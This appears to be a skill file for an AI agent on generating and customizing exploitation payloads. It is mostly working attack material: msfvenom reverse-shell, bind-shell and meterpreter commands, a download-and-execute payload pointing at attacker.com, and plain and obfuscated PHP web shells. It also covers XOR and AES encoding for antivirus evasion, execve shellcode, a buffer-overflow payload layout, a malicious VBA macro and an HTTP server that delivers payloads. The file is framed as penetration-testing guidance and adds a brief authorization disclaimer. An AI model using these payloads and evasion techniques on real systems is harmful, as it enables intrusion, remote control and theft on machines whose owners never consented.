---
name: Payload Generation and Customization
description: Techniques for creating and adapting payloads for various exploitation scenarios, target environments, and evasion requirements
when_to_use: During exploit development, when customizing payloads for specific targets, bypassing security controls, or optimizing payload size and stealth
version: 1.0.0
languages: python, assembly, shellcode
---

# Payload Generation and Customization

## Overview

Payload generation creates the code that executes on target systems after successful exploitation. Effective payloads must work within constraints (bad characters, size limits), evade detection, and achieve objectives reliably. This skill covers payload types, generation techniques, encoding, and customization.

**Core principle:** Start with standard payloads, customize for target constraints, test thoroughly in safe environment.

## Payload Types

### Shell Payloads

```bash
# Reverse Shell - Connect back to attacker
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.0.0.1 \
         LPORT=4444 \
         -f python

# Bind Shell - Listen on target
msfvenom -p linux/x64/shell_bind_tcp \
         LPORT=4444 \
         -f c

# Staged vs Stageless
# Staged: Small initial payload, downloads larger second stage
msfvenom -p windows/meterpreter/reverse_tcp ...

# Stageless: Complete payload in one piece (more reliable)
msfvenom -p windows/meterpreter_reverse_tcp ...
```

### Command Execution

```bash
# Execute single command
msfvenom -p linux/x64/exec \
         CMD="id" \
         -f raw

# Download and execute
msfvenom -p windows/x64/download_exec \
         URL=http://attacker.com/payload.exe \
         -f exe
```

### Web Shells

```php
# Simple PHP web shell
<?php system($_GET['cmd']); ?>

# More featured web shell
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

# Obfuscated version
<?php
$a = str_rot13('flfgrz');  // 'system'
$b = $_GET['c'];
$a($b);
?>
```

## Encoding and Evasion

### Bad Character Avoidance

```bash
# Common bad characters: \x00 \x0a \x0d
# Identify bad chars through testing

# Generate with bad char exclusion
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.0.0.1 LPORT=4444 \
         -b '\x00\x0a\x0d' \
         -f python

# Multiple encoding passes
msfvenom -p windows/shell_reverse_tcp \
         LHOST=10.0.0.1 LPORT=4444 \
         -e x86/shikata_ga_nai \
         -i 5 \
         -f exe
```

### Custom Encoders

```python
# XOR encoder
def xor_encode(shellcode, key=0x42):
    encoded = b""
    for byte in shellcode:
        encoded += bytes([byte ^ key])
    return encoded

# Decoder stub (x86 assembly example)
decoder_stub = b"""
    xor ecx, ecx
    mov cl, <length>
    lea esi, [shellcode]
decode_loop:
    xor byte [esi], 0x42
    inc esi
    loop decode_loop
    jmp shellcode
"""
```

### AV Evasion Techniques

```python
# 1. Encryption
from Crypto.Cipher import AES

def encrypt_payload(payload, key):
    cipher = AES.new(key, AES.MODE_CBC)
    return cipher.encrypt(payload)

# 2. Polymorphism - Change payload each time
# Use variable NOP sleds, instruction substitution

# 3. Process Injection
# Inject into legitimate process instead of standalone executable

# 4. Timing-based execution
# Sleep/delay before payload execution to evade sandboxes
```

## Custom Shellcode

### Writing Assembly

```nasm
; Linux x64 execve("/bin/sh")
section .text
global _start

_start:
    xor rax, rax
    push rax              ; null terminator
    mov rbx, 0x68732f6e69622f  ; "/bin/sh" in reverse
    push rbx
    mov rdi, rsp          ; rdi = pointer to "/bin/sh"
    push rax
    push rdi
    mov rsi, rsp          ; rsi = ["/bin/sh", NULL]
    mov rdx, rax          ; rdx = NULL
    mov al, 59            ; syscall number for execve
    syscall
```

```bash
# Assemble and extract shellcode
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
objdump -d shellcode | grep '[0-9a-f]:' | cut -f2 -d: | cut -f1-7 -d' '
```

### Shellcode Optimization

```python
# Minimize size for tight buffer constraints
# - Use smaller instructions (xor eax,eax vs mov eax,0)
# - Reuse registers
# - Remove unnecessary operations
# - Use push/pop for stack management

# Test shellcode size
print(f"Shellcode size: {len(shellcode)} bytes")

# Check for null bytes
if b'\x00' in shellcode:
    print("Warning: Null bytes detected!")
```

## Multi-Stage Payloads

```python
# Stage 1: Small initial payload
# - Receives and executes stage 2
# - Fits in tight buffer

stage1 = b"""
    ; Connect back to attacker
    ; Receive stage 2
    ; Execute stage 2
"""

# Stage 2: Full-featured payload
# - Reverse shell
# - C2 agent
# - Post-exploitation tools
```

## Payload Delivery Methods

### In Exploits

```python
# Buffer overflow example
offset = 268
payload = b"A" * offset
payload += p64(return_address)  # Control EIP/RIP
payload += shellcode            # Payload to execute
```

### Via Files

```python
# Malicious PDF, Office doc, etc.
# Embed payload in file format

# Using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.0.0.1 LPORT=4444 \
         -f vba \
         > malicious_macro.vba
```

### Over Network

```python
# Deliver via HTTP, FTP, etc.
# Target downloads and executes

import http.server

class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/payload':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(payload)
```

## Testing Payloads

```bash
# Test in safe environment
# - Virtual machines
# - Isolated network
# - Proper authorization

# Verify functionality
nc -lvnp 4444  # Listener for reverse shell

# Run payload in test environment
./exploit target_ip

# Confirm connection received
```

## Tool Ecosystem

**Generation:**
- msfvenom (Metasploit)
- custom shellcode writing

**Encoding:**
- msfvenom encoders
- Custom encoders in Python

**Testing:**
- MSF payload testing modules
- Custom test harnesses

## Common Pitfalls

| Mistake | Impact | Solution |
|---------|--------|----------|
| Not checking bad characters | Payload corrupted | Test and encode properly |
| Hardcoding addresses | Not portable | Use relative addressing |
| Ignoring payload size | Won't fit in buffer | Optimize or stage |
| Skipping testing | Payload fails in production | Test thoroughly |
| Poor OPSEC | Detection | Use evasion techniques |

## Integration with Other Skills

- skills/exploitation/exploit-dev-workflow - Payload is part of exploit
- skills/exploitation/fuzzing-harness - Test payload reliability
- skills/analysis/binary-analysis - Understand target environment

## Legal and Ethical Considerations

- Only generate payloads for authorized testing
- Don't distribute malicious payloads
- Understand legal implications
- Follow responsible disclosure practices

## References

- Metasploit documentation
- "The Shellcoder's Handbook"
- Exploit-DB shellcode database
- Security research blogs
